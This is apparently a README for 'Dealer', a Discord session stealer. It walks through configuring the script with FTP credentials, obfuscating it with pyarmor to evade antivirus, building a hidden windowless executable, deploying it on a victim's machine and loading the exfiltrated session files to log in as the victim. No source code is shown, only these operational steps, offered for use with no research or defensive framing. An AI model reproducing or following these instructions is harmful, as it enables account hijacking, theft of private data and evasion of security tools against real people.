# Dealer
Discord session stealer

Simple tool for stealing discord's session files, zipping them and sending archive via ftp

In order to use this tool you need either python3 installed on target machine or
you need to build standalone executables

# Running on platform with python

1) Change 'dealer.py'. Insert FTP credentials - IP, port, username, password and remote directory to save zip archive to.
   Use code editor of choice
2) Deploy dealer.py on target machine and run "python dealer.py"

# Building

1) Change 'dealer.py'. Insert FTP credentials - IP, port, username, password and remote directory to save zip archive to.
   Use code editor of choice
2) Install requirements: 
    pyarmor - obfuscate code to hide creds and reduce antivirus alarm possibility
    pyinstaller - build standalone executables from python scripts
    Run 'pip install pyarmor pyinstaller'
3) Build executable using provided build scripts (bat on Windows, sh on Linux)
   Scripts require arguments for pyinstaller. Common ones: "-F" - pack to single binary file; "-w" - window mode
   (basically make app invisible on windows)
   Run 'build.bat(.sh) -F -w' 
4) Deploy built executable from "dist" folder to target machine and run it

# Logging in target's session

1) Unpack received zip file from ftp-server to your discord directory with discord app closed
   On Windows - go to %AppData%\discord
   On Linux - ~/.config/discord
2) Run discord and you will get target's session